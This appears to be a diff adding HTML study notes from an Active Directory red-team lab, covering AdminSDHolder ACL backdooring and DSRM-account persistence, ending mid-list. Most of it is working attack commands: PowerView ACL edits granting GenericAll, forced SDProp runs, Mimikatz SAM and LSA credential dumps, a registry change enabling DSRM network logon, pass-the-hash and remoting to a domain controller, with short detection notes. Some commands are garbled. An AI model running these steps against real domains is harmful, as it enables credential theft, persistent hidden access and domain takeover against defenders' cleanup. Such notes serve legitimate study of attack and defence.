+<p>🔥 student1 now has full rights to all of them without being in any group.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<p>✅ <strong>Alternative: Use RACE Toolkit + ActiveDirectory Module</strong></p>
+<pre class="powershell"><code>
+Set-DCPermissions `
+
+  -Method AdminSDHolder `
+
+  -SAMAccountName student1 `
+
+  -Right GenericAll `
+
+  -DistinguishedName &#39;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#39; `
+
+  -Verbose
+</code></pre>
+<p>🔹 This also adds <strong>GenericAll</strong> (same as FullControl) for <code>student1</code> on AdminSDHolder.</p>
+<hr />
+<p>✅ <strong>Step 2 (Optional): Give Specific Permissions (e.g., ResetPassword, WriteMembers)</strong></p>
+<p>Instead of FullControl, you can grant specific rights:</p>
+<p><strong>ResetPassword:</strong></p>
+<p><strong>WriteMembers (i.e., modify group memberships):</strong></p>
+<pre class="powershell"><code>
+Add-DomainObjectAcl `
+
+  -TargetIdentity &#39;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#39; `
+
+  -PrincipalIdentity student1 `
+
+  -Rights ResetPassword `
+
+  -PrincipalDomain dollarcorp.moneycorp.local `
+
+  -TargetDomain dollarcorp.moneycorp.local `
+
+  -Verbose
+</code></pre>
+<pre class="powershell"><code>
+Add-DomainObjectAcl `
+
+  -TargetIdentity &#39;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#39; `
+
+  -PrincipalIdentity student1 `
+
+  -Rights WriteMembers `
+
+  -PrincipalDomain dollarcorp.moneycorp.local `
+
+  -TargetDomain dollarcorp.moneycorp.local `
+
+  -Verbose
+</code></pre>
+<hr />
+<h4 id="step-3-force-sdprop-immediately-instead-of-waiting-60-mins">⏱️ <strong>Step 3: Force SDProp Immediately (Instead of Waiting 60 Mins)</strong></h4>
+<p>Run this <strong>on the PDC Emulator</strong> to force SDProp now:</p>
+<p><strong>For Server 2008 and later:</strong></p>
+<pre class="powershell"><code>
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+</code></pre>
+<p><strong>For Pre-2008 systems:</strong></p>
+<pre class="powershell"><code>
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
+</code></pre>
+<p>🔁 This forces AdminSDHolder’s ACL to be <strong>applied to all protected users and groups immediately</strong>.</p>
+<hr />
+<p><strong>🔍 Step 4: Verify if <code>student1</code> Got Added to Domain Admins ACL</strong></p>
+<p>Now you check if <code>student1</code> is present in the ACL of <code>Domain Admins</code>:</p>
+<p><strong>🧰 Using PowerView (normal user):</strong></p>
+<pre class="powershell"><code>
+Get-DomainObjectAcl -Identity &#39;Domain Admins&#39; -ResolveGUIDs |
+
+  ForEach-Object {
+
+    $_ | Add-Member NoteProperty &#39;IdentityName&#39; $(Convert-SidToName $_.SecurityIdentifier); $_
+
+  } | ? { $_.IdentityName -match &quot;student1&quot; }
+</code></pre>
+<p><strong>🧰 Using ActiveDirectory Module:</strong></p>
+<pre class="powershell"><code>
+(Get-Acl -Path &#39;AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&#39;).Access |
+
+  ? { $_.IdentityReference -match &#39;student1&#39; }
+</code></pre>
+<p>✅ If the output shows entries for <code>student1</code>, it means <strong>SDProp has applied AdminSDHolder’s ACL</strong> to <code>Domain Admins</code>.</p>
+<hr />
+<h4 id="summary">🧠 Summary:</h4>
+<div class="line-block">Step | Action | Result |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">1️⃣ | Add <code>student1</code> to AdminSDHolder ACL | Sets up persistence |</div>
+<div class="line-block">2️⃣ | Assign FullControl or granular permissions | <code>student1</code> gains stealthy control |</div>
+<div class="line-block">3️⃣ | Run <code>Invoke-SDPropagator</code> | Forces the ACL to replicate |</div>
+<div class="line-block">4️⃣ | Verify on <code>Domain Admins</code> or others | Confirms persistence works |</div>
+<hr />
+<p>This technique is used by <strong>advanced red teamers and APT actors</strong> to maintain <strong>stealthy, long-term access</strong> without group membership.</p>
+<h4 id="real-world-abuses-by-protected-groups-for-lateral-movement-persistence">🛠️ Real-World Abuses by Protected Groups (for lateral movement / persistence)</h4>
+<p><strong>🧪 Examples:</strong></p>
+<div class="line-block">Group | Abuse |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Account Operators</strong> | Can’t modify DA/EA, but can manipulate nested groups and reset passwords. |</div>
+<div class="line-block"><strong>Backup Operators</strong> | Can <strong>backup GPO</strong>, modify it to include <code>backdooruser</code>, and <strong>restore</strong> it — even to <strong>DA group</strong>. |</div>
+<div class="line-block"><strong>Server Operators</strong> | Can <strong>start services as SYSTEM</strong> on DC (Browser service) = <strong>code execution</strong>. |</div>
+<div class="line-block"><strong>Print Operators</strong> | Can <strong>load device drivers</strong> (signed ones) = kernel-level access or <strong>copy <code>ntds.dit</code></strong> via shadow copies. |</div>
+<hr />
+<h4 id="advanced-abuse">💥 Advanced Abuse</h4>
+<p>With WriteDACL on Domain Admins, an attacker can:</p>
+<ul>
+<li><p>Add <strong>ACE</strong> that grants <strong>“GenericAll”</strong> or <strong>“WriteMember”</strong>.</p></li>
+<li><p>Or just <strong>reset the DACL to default</strong>, removing all detection barriers.</p></li>
+</ul>
+<p>Even if the user is removed from Domain Admins group, <strong>they still control the group via ACL</strong>.</p>
+<hr />
+<h4 id="how-to-detect-adminsdholder-acl-abuse">🧹 How to Detect AdminSDHolder ACL Abuse</h4>
+<p><strong>🛡️ Detection:</strong></p>
+<ul>
+<li><p>Use <strong>BloodHound</strong> to identify users with dangerous ACL rights.</p></li>
+<li><p>Check <strong>AdminSDHolder ACL</strong> manually or with:</p>
+<ul>
+<li><code>Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=com"</code></li>
+<li><code>Get-DomainObjectAcl</code> (PowerView)</li>
+</ul></li>
+</ul>
+<p><strong>📍Indicators:</strong></p>
+<ul>
+<li><p>Users not in DA/EA but have <code>GenericAll</code> on AdminSDHolder.</p></li>
+<li><p>Non-standard ACEs on AdminSDHolder or protected groups.</p></li>
+</ul>
+<hr />
+<h4 id="how-to-remediate">🔐 How to Remediate</h4>
+<ul>
+<li><p>Restore <strong>default ACLs</strong> on AdminSDHolder.</p></li>
+<li><p>Remove <strong>unauthorized ACEs</strong> using <code>Set-Acl</code> or ADSIEdit.</p></li>
+<li><p>Rotate passwords for all impacted privileged accounts.</p></li>
+<li><p>Run <code>SDProp</code> manually to force re-propagation:</p>
+<pre class="powershell"><code>repadmin /propagate &lt;PDC-HOSTNAME&gt; &lt;NC&gt; &lt;GUID&gt; /sync
+</code></pre></li>
+</ul>
+<h4 id="can-we-have-different-acls-for-different-protected-groups">❓<strong>Can we have different ACLs for different protected groups?</strong></h4>
+<blockquote>
+<p>❌ No, because SDProp copies the same ACL from AdminSDHolder to all protected users and groups every 60 minutes — overwriting any custom ACLs.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="so-what-if-we-want-different-acls-for-different-protected-groups">So what if we want <strong>different ACLs</strong> for different protected groups?</h4>
+<p>That’s where things get tricky.</p>
+<p><strong>⚠️ Short Answer:</strong></p>
+<blockquote>
+<p>You can’t do that reliably while SDProp is active.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>Any <strong>manual or programmatic change</strong> to the ACL of a protected group/user (e.g., give <code>helpdesk_user</code> <code>WriteMember</code> on only <code>Backup Operators</code>) will be <strong>overwritten</strong> by SDProp unless you change the source ACL: <strong>AdminSDHolder</strong>.</p>
+<h4 id="options-to-handle-this-scenario">✅ Options to Handle This Scenario:</h4>
+<ol type="1">
+<li><p><strong>Remove object from protected group</strong></p>
+<p>→ Set <code>adminCount=0</code></p>
+<p>→ Now you can apply a custom ACL (but object won’t be protected anymore).</p></li>
+<li><p><strong>Don’t use protected groups for delegation</strong></p>
+<p>→ Use <strong>custom groups</strong> instead and assign <strong>custom ACLs</strong> freely.</p></li>
+<li><p><strong>Modify AdminSDHolder ACL carefully</strong></p>
+<p>→ But changes apply to <strong>all protected objects</strong>, not individually.</p></li>
+<li><p><strong>Disabling SDProp (not recommended)</strong></p>
+<p>→ Possible via registry but <strong>very risky</strong> and breaks AD security model.</p></li>
+</ol>
+<hr />
+<h4 id="bottom-line">🔐 Bottom Line:</h4>
+<blockquote>
+<p>Protected groups must share the same ACL, defined by AdminSDHolder.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p>For custom permissions, <strong>avoid using protected groups</strong>.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>Let me know if you want a real-world example or demo setup.</p>
+<h3 id="example-conditions">Example &amp; Conditions</h3>
+<h4 id="who-can-modify-adminsdholder-by-default">🧠 1. Who Can Modify AdminSDHolder (By Default)</h4>
+<p>AdminSDHolder is <strong>just an AD object</strong>, so its ACL defines who can modify it.</p>
+<p><strong>🔐 Default Principals with Control</strong></p>
+<p>Typically:</p>
+<ul>
+<li><p><strong>Domain Admins</strong></p></li>
+<li><p><strong>Enterprise Admins</strong></p></li>
+<li><p><strong>SYSTEM (Domain Controller)</strong></p></li>
+<li><p>Sometimes <strong>Administrators group</strong></p></li>
+</ul>
+<hr />
+<p><strong>🧠 Meaning</strong></p>
+<pre><code>
+Only HIGH privilege principals can modify AdminSDHolder by default
+</code></pre>
+<p>👉 That’s why you rarely see direct access.</p>
+<hr />
+<h4 id="so-if-you-dont-have-access-whats-the-real-path">🔥 2. So If You Don’t Have Access → What’s the Real Path?</h4>
+<p>👉 The real-world answer:</p>
+<pre><code>
+You don’t target AdminSDHolder first
+
+You escalate to something that CAN modify it
+</code></pre>
+<hr />
+<h4 id="the-real-question-you-should-ask">🧠 3. The Real Question You Should Ask</h4>
+<p>Instead of:</p>
+<blockquote>
+<p>“How do I access AdminSDHolder?”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>Think:</p>
+<pre><code>
+“Who has rights over AdminSDHolder, and how do I become them?”
+</code></pre>
+<h4 id="conditions-required-for-abuse">⚙️ 1. Conditions Required for Abuse</h4>
+<hr />
+<p><strong>✅ Minimum Condition</strong></p>
+<p>You need ANY of these on AdminSDHolder:</p>
+<ul>
+<li><p>WriteDACL ✅ (most common)</p></li>
+<li><p>GenericAll ✅</p></li>
+<li><p>GenericWrite (sometimes, if enough control)</p></li>
+<li><p>WriteOwner (can escalate to WriteDACL)</p></li>
+</ul>
+<hr />
+<p><strong>❗ That’s it</strong></p>
+<pre><code>
+No need to touch Domain Admins directly
+</code></pre>
+<hr />
+<p><strong>🔥 Realistic Misconfig</strong></p>
+<p>Example:</p>
+<pre><code>
+Helpdesk group → WriteDACL → AdminSDHolder
+</code></pre>
+<p>👉 Boom → full domain compromise possible</p>
+<h4 id="why-it-works-core-logic">🧠 2. Why It Works (Core Logic)</h4>
+<hr />
+<p><strong>Normal Case</strong></p>
+<pre><code>
+AdminSDHolder ACL
+
+    ↓
+
+SDProp
+
+    ↓
+
+Protected Users (overwrite)
+</code></pre>
+<hr />
+<p><strong>After Attack</strong></p>
+<pre><code>
+You modify AdminSDHolder ACL
+
+    ↓
+
+SDProp copies YOUR permissions
+
+    ↓
+
+All admins become accessible to you
+</code></pre>
+<h4 id="common-indirect-paths-to-adminsdholder">🔗 Common Indirect Paths to AdminSDHolder</h4>
+<p><strong>⚔️ PATH 1: WriteDACL / GenericAll on DOMAIN</strong></p>
+<p><strong>🧠 Why this works</strong></p>
+<ul>
+<li><p>Domain object controls <strong>permissions over entire directory</strong></p></li>
+<li><p>Includes ability to modify ACLs on:</p>
+<ul>
+<li>AdminSDHolder</li>
+<li>Users</li>
+<li>Groups</li>
+</ul></li>
+</ul>
+<hr />
+<p><strong>🔥 Attack Logic</strong></p>
+<pre><code>
+WriteDACL on DOMAIN
+
+    ↓
+
+Modify ACL of AdminSDHolder
+
+    ↓
+
+Backdoor it
+
+    ↓
+
+SDProp → Domain Admin control
+</code></pre>
+<hr />
+<p><strong>🧪 Example Flow</strong></p>
+<pre class="powershell"><code>
+# Step 1: Add yourself to AdminSDHolder ACL via domain rights
+
+Add-DomainObjectAcl -TargetIdentity &quot;CN=AdminSDHolder,CN=System,DC=domain,DC=local&quot; -PrincipalIdentity lowuser -RightsAll
+</code></pre>
+<hr />
+<p><strong>💥 Impact</strong></p>
+<pre><code>
+Domain WriteDACL = indirect AdminSDHolder compromise
+</code></pre>
+<h4 id="path-2-ou-privileged-group-adminsdholder-chain">⚔️ PATH 2: OU → Privileged Group → AdminSDHolder Chain</h4>
+<hr />
+<p><strong>🧠 Indirect escalation</strong></p>
+<pre><code>
+GenericWrite → OU
+
+    ↓
+
+Control users
+
+    ↓
+
+Add yourself to privileged group
+
+    ↓
+
+Gain rights over AdminSDHolder
+</code></pre>
+<hr />
+<p>👉 This happens when:</p>
+<ul>
+<li><p>Delegation is misconfigured</p></li>
+<li><p>AdminSDHolder ACL includes privileged group you can join</p></li>
+</ul>
+<h4 id="how-to-enumerate-adminsdholder">🔍 3. How to ENUMERATE AdminSDHolder</h4>
+<hr />
+<p><strong>🎯 Method 1: PowerView</strong></p>
+<pre class="powershell"><code>
+Get-DomainObjectAcl -Identity &quot;CN=AdminSDHolder,CN=System,DC=domain,DC=local&quot; -ResolveGUIDs
+
+IdentityReference : DOMAIN\helpdesk
+
+ActiveDirectoryRights : WriteDACL
+
+ObjectDN : CN=AdminSDHolder,CN=System,DC=domain,DC=local
+</code></pre>
+<p><strong>🎯 Method 2: BloodHound</strong></p>
+<p>Look for edge:</p>
+<pre><code>
+User → WriteDACL → AdminSDHolder
+</code></pre>
+<hr />
+<p><strong>🧠 What you’re looking for</strong></p>
+<pre><code>
+Non-admin user/group having:
+
+- WriteDACL
+
+- GenericAll
+
+- WriteOwner
+</code></pre>
+<hr />
+<h4 id="how-to-modify-it-conceptual">⚔️ 4. How to MODIFY It (Conceptual)</h4>
+<hr />
+<p><strong>🎯 Goal</strong></p>
+<p>Add yourself into ACL:</p>
+<pre><code>
+attacker → GenericAll
+</code></pre>
+<hr />
+<p><strong>🧠 What happens internally</strong></p>
+<p>You change:</p>
+<pre><code>
+nTSecurityDescriptor (ACL)
+</code></pre>
+<p>of:</p>
+<pre><code>
+AdminSDHolder
+</code></pre>
+<hr />
+<p><strong>🔄 After modification</strong></p>
+<pre><code>
+SDProp runs
+
+    ↓
+
+Copies modified ACL
+
+    ↓
+
+Applies to all protected users
+</code></pre>
+<hr />
+<h4 id="what-you-gain-after-that">💥 5. What You Gain After That</h4>
+<hr />
+<p>Once SDProp runs:</p>
+<p>You now have:</p>
+<pre><code>
+GenericAll → Domain Admin user
+</code></pre>
+<hr />
+<h4 id="then-you-can">⚔️ Then you can:</h4>
+<ul>
+<li><p>Reset password</p></li>
+<li><p>Add yourself to DA group</p></li>
+<li><p>DCSync</p></li>
+<li><p>Full domain takeover</p></li>
+</ul>
+<hr />
+<h4 id="why-this-is-perfect-for-persistence">🔄 6. Why This is PERFECT for Persistence</h4>
+<hr />
+<p><strong>Scenario</strong></p>
+<p>Defender:</p>
+<ul>
+<li><p>Removes you from DA</p></li>
+<li><p>Resets passwords</p></li>
+</ul>
+<hr />
+<p><strong>But forgets:</strong></p>
+<pre><code>
+AdminSDHolder is still backdoored
+</code></pre>
+<hr />
+<p><strong>Result</strong></p>
+<pre><code>
+Next SDProp run →
+
+Your access comes back 😈
+</code></pre>
+<hr />
+<h4 id="common-misunderstanding-very-important">🚨 6. Common Misunderstanding (VERY IMPORTANT)</h4>
+<hr />
+<p><strong>❌ Myth</strong></p>
+<p>“I need access to protected account first”</p>
+<hr />
+<p><strong>✅ Reality</strong></p>
+<p>You bypass protected accounts completely</p>
+<p>by attacking AdminSDHolder</p>
+<h4 id="enumeration-with-commands">🔍 7. ENUMERATION (WITH COMMANDS)</h4>
+<hr />
+<p><strong>🎯 PowerView Enumeration</strong></p>
+<pre class="powershell"><code>
+Get-DomainObjectAcl -Identity &quot;CN=AdminSDHolder,CN=System,DC=domain,DC=local&quot; -ResolveGUIDs
+
+ObjectDN              : CN=AdminSDHolder,CN=System,DC=domain,DC=local
+
+ActiveDirectoryRights : WriteDACL
+
+IdentityReference     : DOMAIN\lowuser
+</code></pre>
+<p>👉 🔥 This means:</p>
+<pre><code>
+lowuser → WriteDACL → AdminSDHolder
+</code></pre>
+<hr />
+<h4 id="check-protected-users">🎯 Check Protected Users</h4>
+<pre><code>
+Get-DomainUser -LDAPFilter &quot;(adminCount=1)&quot;
+
+samaccountname : admin1
+
+adminCount     : 1
+
+samaccountname : administrator
+
+adminCount     : 1
+</code></pre>
+<hr />
+<h4 id="modify-adminsdholder-attack">⚔️ 5. MODIFY AdminSDHolder (ATTACK)</h4>
+<hr />
+<p><strong>🎯 Goal</strong></p>
+<p>Add attacker to ACL:</p>
+<pre><code>
+lowuser → GenericAll
+</code></pre>
+<hr />
+<h4 id="step-1-add-acl-entry">⚔️ Step 1: Add ACL Entry</h4>
+<pre class="powershell"><code>
+Add-DomainObjectAcl -TargetIdentity &quot;CN=AdminSDHolder,CN=System,DC=domain,DC=local&quot; -PrincipalIdentity lowuser -RightsAll
+</code></pre>
+<hr />
+<p><strong>✔ Verify Change</strong></p>
+<pre class="powershell"><code>
+Get-DomainObjectAcl -Identity &quot;CN=AdminSDHolder,CN=System,DC=domain,DC=local&quot; -ResolveGUIDs
+
+IdentityReference     : DOMAIN\lowuser
+
+ActiveDirectoryRights : GenericAll
+</code></pre>
+<h4 id="wait-for-sdprop">⏱️ 6. WAIT FOR SDProp</h4>
+<p><strong>🧠 Default Behavior</strong></p>
+<pre><code>
+Runs every ~60 minutes
+</code></pre>
+<hr />
+<h4 id="optional-force-sdprop-instead-of-waiting">⚡ OPTIONAL: Force SDProp (instead of waiting)</h4>
+<pre><code>
+Invoke-Command-ComputerNameDC01-ScriptBlock {repadmin/syncall}
+</code></pre>
+<p>OR (manual trigger via DC):</p>
+<pre><code>
+ldp.exe → Modify → Run FixUpInheritance (advanced)
+</code></pre>
+<h4 id="clean-attack-chain">🧠 7. Clean Attack Chain</h4>
+<hr />
+<pre><code>
+Compromised User
+
+    ↓
+
+Find WriteDACL → AdminSDHolder
+
+    ↓
+
+Modify ACL (add yourself)
+
+    ↓
+
+Wait for SDProp
+
+    ↓
+
+Gain control over Domain Admins
+</code></pre>
+<hr />
+<h4 id="minimal-conditions-summary">🔥 11. Minimal Conditions Summary</h4>
+<div class="line-block">Requirement | Needed? |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Compromise Domain Admin | ❌ No |</div>
+<div class="line-block">Access protected user | ❌ No |</div>
+<div class="line-block">WriteDACL on AdminSDHolder | ✅ Yes |</div>
+<div class="line-block">Wait for SDProp | ✅ Yes |</div>
+<hr />
+<h4 id="final-understanding">🧠 FINAL UNDERSTANDING</h4>
+<hr />
+<pre><code>
+AdminSDHolder is NOT just persistence
+
+It is:
+
+Privilege escalation + persistence
+</code></pre>
+<hr />
+<blockquote>
+<p><strong>“You don’t need access to admins — you just need permission to change the template that controls them.”</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h2 id="dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</h2>
+<h4 id="what-is-dsrm-directory-services-restore-mode">⚡ <strong>What is DSRM (Directory Services Restore Mode)?</strong></h4>
+<p>👉 DSRM is a special boot mode for Domain Controllers (DCs) that allows recovery or repair of Active Directory (AD).</p>
+<p>👉 When a Windows server is promoted to a <strong>Domain Controller (DC)</strong>, a special recovery account is created called the <strong>Directory Services Restore Mode (DSRM) Administrator</strong>.</p>
+<p>👉 This is a <strong>local admin account</strong> on the DC — it is not part of Active Directory.</p>
+<p>👉 The DSRM Administrator password (also called the <strong>SafeModePassword</strong>) is set during promotion and <strong>rarely changed</strong> after that in most environments.</p>
+<p>➡ This account is meant to be used <strong>only when booting into DSRM mode for recovery or repair of AD</strong>.</p>
+<p>➡ Even though DCs normally authenticate users via AD, the DSRM account provides <strong>local admin access</strong> to the DC when needed (especially in restore scenarios)</p>
+<ul>
+<li><p>Normal DC boot → Active Directory online</p></li>
+<li><p>DSRM boot → AD offline, safe mode (for repairs/restores)</p></li>
+</ul>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>The above screenshot shows sever being promoted to a DC where it requires DSRM password.</p>
+<hr />
+<h4 id="why-is-the-dsrm-account-a-target-for-attackers">⚡ <strong>Why is the DSRM account a target for attackers?</strong></h4>
+<ul>
+<li><p>The DSRM account is <strong>often overlooked</strong> by admins that means password is often forgotten or not changed for years.</p></li>
+<li><p>If an attacker can dump or crack its password, or pass its NTLM hash, they can:</p>
+<ul>
+<li>Gain <strong>local admin access</strong> to the DC even without AD working.</li>
+<li>Manipulate or damage AD from the DC’s local context.</li>
+<li>Perform actions that don’t generate AD-based logs (harder to detect).</li>
+</ul></li>
+</ul>
+<hr />
+<h4 id="key-fact-to-remember">🚩 <strong>Key fact to remember</strong></h4>
+<p>👉 The DSRM Administrator <strong>is always the local Administrator account</strong> on the DC (SID ending with <code>-500</code>).</p>
+<p>👉 It’s not part of Active Directory; it’s stored in the <strong>local SAM database</strong> of the DC.</p>
+<hr />
+<h4 id="how-an-attacker-carries-out-a-dsrm-attack">⚡ <strong>How an attacker carries out a DSRM attack</strong></h4>
+<p>Let’s walk through the process using your provided commands.</p>
+<hr />
+<p><strong>1️⃣ Attacker compromises a machine and gains Domain Admin (DA) privileges</strong></p>
+<blockquote>
+<p>You must already have Domain Admin privileges because:</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<ul>
+<li>You need access to sensitive parts of the DC (e.g., LSASS memory, SAM database).</li>
+</ul>
+<hr />
+<p>2️⃣ <strong>Dump the DSRM password hash from the SAM database</strong></p>
+<p>The attacker runs:</p>
+<pre class="powershell"><code>
+Invoke-Mimikatz -Command &#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39; -Computer dcorp-dc
+</code></pre>
+<p>➡ What this does:</p>
+<ul>
+<li><p><code>token::elevate</code> — elevates privilege (impersonate SYSTEM token if needed).</p></li>
+<li><p><code>lsadump::sam</code> — dumps local accounts stored in the SAM database (on the DC this includes the <strong>DSRM Administrator</strong>).</p></li>
+</ul>
+<p>✅ <strong>Result:</strong> You get the NTLM hash of the DSRM Administrator account (the local admin on the DC).</p>
+<hr />
+<p>3️⃣ <strong>Optionally, dump domain secrets</strong></p>
+<p>The attacker may also run:</p>
+<pre class="powershell"><code>
+Invoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39; -Computer dcorp-dc
+</code></pre>
+<p>➡ What this does:</p>
+<ul>
+<li><p>Dumps LSA secrets (which may include cached domain secrets, service account passwords, etc.).</p></li>
+<li><p>Contains the <strong>domain Administrator hash</strong>, among other things.</p></li>
+</ul>
+<hr />
+<p>4️⃣ <strong>Compare hashes</strong></p>
+<ul>
+<li><p>Compare the <strong>Administrator hash</strong> from <code>lsadump::sam</code> with the <strong>Administrator hash</strong> from <code>lsadump::lsa</code>.</p></li>
+<li><p>If they’re different → the SAM dump is the local DSRM account.</p></li>
+<li><p>If they’re the same → you might have a domain admin account (unlikely, because DSRM is separate).</p></li>
+</ul>
+<hr />
+<p>5️⃣ <strong>By default, DSRM can’t log in during normal operation</strong></p>
+<p>👉 Even with the hash, attackers can’t use it for network logon because of the default logon policy:</p>
+<ul>
+<li><code>DsrmAdminLogonBehavior = 0</code> → DSRM admin can log on <strong>only in DSRM mode</strong> (default).</li>
+</ul>
+<div class="line-block">Value | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">0 | DSRM admin can <em>only</em> log on in DSRM mode (default). |</div>
+<div class="line-block">1 | DSRM admin can log on when AD is stopped. |</div>
+<div class="line-block">2 | DSRM admin can log on even when AD is running (this is what the attacker wants). |</div>
+<p>➡ <strong>By default, you can’t pass-the-hash with DSRM admin unless this is changed!</strong></p>
+<p>6️⃣ <strong>Change logon behavior</strong></p>
+<p>👉 The attacker changes the registry setting remotely to allow normal logons:</p>
+<pre><code>
+winrs -r:dcorp-dc cmd
+
+reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;DsrmAdminLogonBehavior&quot; /t REG_DWORD /d 2 /f
+</code></pre>
+<p>✅ <strong>Explanation:</strong></p>
+<ul>
+<li><p><code>winrs -r:dcorp-dc cmd</code> → Runs a remote shell (Windows Remote Shell) on <code>dcorp-dc</code>.</p></li>
+<li><p><code>reg add ... /v DsrmAdminLogonBehavior /d 2 /f</code> → Adds or updates the <code>DsrmAdminLogonBehavior</code> registry value and sets it to <code>2</code>.</p></li>
+<li><p>This allows the DSRM admin account to log on <strong>even when AD is fully running</strong> → now you can use the hash over the network.</p></li>
+</ul>
+<blockquote>
+<p><strong><em>Note:- Changing Logon behavior(registry modification) is very noisy and gets detected very easily.</em></strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<p>7️⃣ <strong>Pass-the-Hash using the DSRM admin’s hash</strong></p>
+<p>👉 The attacker uses Mimikatz to forge a session using the DSRM admin hash:</p>
+<pre><code>
+Invoke-Mimikatz &quot;sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:&lt;DSRM_NTLM_HASH&gt; /run:powershell.exe&quot;
+
+ls \\dcdcorp-d\C$
+</code></pre>
+<p>✅ <strong>Explanation:</strong></p>
+<ul>
+<li><p><code>sekurlsa::pth</code> → Starts a new process with a forged token, using the provided NTLM hash.</p></li>
+<li><p><code>/domain:dcorp-dc</code> → Targets the DC.</p></li>
+<li><p><code>/user:Administrator</code> → This is the DSRM local admin.</p></li>
+<li><p><code>/ntlm:&lt;hash&gt;</code> → This is the NTLM hash obtained earlier from dumping SAM.</p></li>
+<li><p><code>/run:powershell.exe</code> → Starts a PowerShell process in the context of the forged credentials.</p></li>
+</ul>
+<p>➡ You now have a shell that behaves as if you logged on with the DSRM admin’s credentials.</p>
+<blockquote>
+<p>You run this on: <strong>Your compromised machine</strong>— where you already have admin (or SYSTEM) privileges.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h4 id="optional-steps-">Optional steps:-</h4>
+<p><strong>8️⃣ Allow connection to the target via PowerShell remoting</strong></p>
+<p>👉 The attacker now sets up to connect via PowerShell remoting:</p>
+<pre><code>
+Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
+</code></pre>
+<p>✅ <strong>Explanation:</strong></p>
+<ul>
+<li><p>Updates the WSMan TrustedHosts list to include <code>172.16.2.1</code> (the DC’s IP).</p></li>
+<li><p>Required because PowerShell Remoting (PSSession) won’t connect to untrusted hosts when using implicit credentials.</p></li>
+</ul>
+<h4 id="establish-a-session-to-the-dc"><strong>9. Establish a session to the DC</strong></h4>
+<pre class="powershell"><code>
+Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
+</code></pre>
+<p>✅ <strong>Explanation:</strong></p>
+<ul>
+<li><p>Starts an interactive PowerShell session on the DC (<code>172.16.2.1</code>).</p></li>
+<li><p><code>NegotiateWithImplicitCredential</code> → Uses the current forged token from the Pass-the-Hash step.</p></li>
+</ul>
+<p>➡ <strong>Result:</strong> You are now interactively connected to the DC using the DSRM account’s context!</p>
+<h3 id="this-allows">This allows:</h3>
+<ul>
+<li><p>Installing malware</p></li>
+<li><p>Disabling protections (e.g., AV, EDR)</p></li>
+<li><p>Direct tampering with AD files on disk</p></li>
+<li><p>Offline AD database modifications (e.g., ntds.dit)</p></li>
+</ul>
+<hr />
+<h4 id="full-attack-chain-summary">⚡ <strong>Full attack chain summary</strong></h4>
+<pre><code>
+[ Attacker gets DA access ]
+
+         ↓
+
+[ Dump SAM — get DSRM admin NTLM hash ]
+
+         ↓
+
+[ Change DsrmAdminLogonBehavior = 2 → allow normal login ]
+
+         ↓
+
+[ Pass-the-Hash → forge session with DSRM admin hash ]
+
+         ↓
+
+[ Connect to DC, act as local admin ]
+</code></pre>
+<hr />
+<h4 id="why-this-attack-is-dangerous">⚡ <strong>Why this attack is dangerous</strong></h4>
+<p>✅ <strong>Hard to detect</strong> — because the DSRM account is local, actions may not be logged in domain logs.</p>
+<p>✅ <strong>Persistence</strong> — attacker could change the DSRM password to lock out legitimate admins during recovery.</p>
+<p>✅ <strong>No network auth needed</strong> — attacker can work locally on the DC without AD involvement.</p>
+<hr />
+<h4 id="defenses">⚡ <strong>Defenses</strong></h4>
+<ul>
+<li><p><strong>Change DSRM passwords regularly</strong> (many orgs don’t do this!).</p></li>
+<li><p><strong>Monitor for <code>lsadump::sam</code> usage</strong> — this is abnormal on DCs.</p></li>
+<li><p><strong>Enable LSA Protection / Credential Guard</strong> — makes dumping harder.</p></li>
+<li><p><strong>Monitor for Pass-the-Hash activity</strong> from accounts named <code>Administrator</code> on DCs.</p></li>
+</ul>
+<hr />
+<h4 id="if-im-already-domain-admin-da-why-target-dsrm">🤔 <strong>If I’m already Domain Admin (DA), why target DSRM?</strong></h4>
+<p>✅ As DA, you already control:</p>
+<ul>
+<li><p>All domain-joined machines, including DCs</p></li>
+<li><p>NTDS.dit, krbtgt hashes, GPOs, user accounts</p></li>
+</ul>
+<p>👉 So why bother with DSRM?</p>
+<hr />
+<h4 id="why-attackers-still-go-after-dsrm">💡 <strong>Why attackers still go after DSRM</strong></h4>
+<p><strong>1️⃣ OS-level control beyond AD</strong></p>
+<ul>
+<li><p>DSRM gives local admin on the DC itself — not just domain-level access</p></li>
+<li><p>Lets you tamper with files, disable security tools, or install rootkits</p></li>
+</ul>
+<hr />
+<p><strong>2️⃣ Persistence that survives clean-up</strong></p>
+<ul>
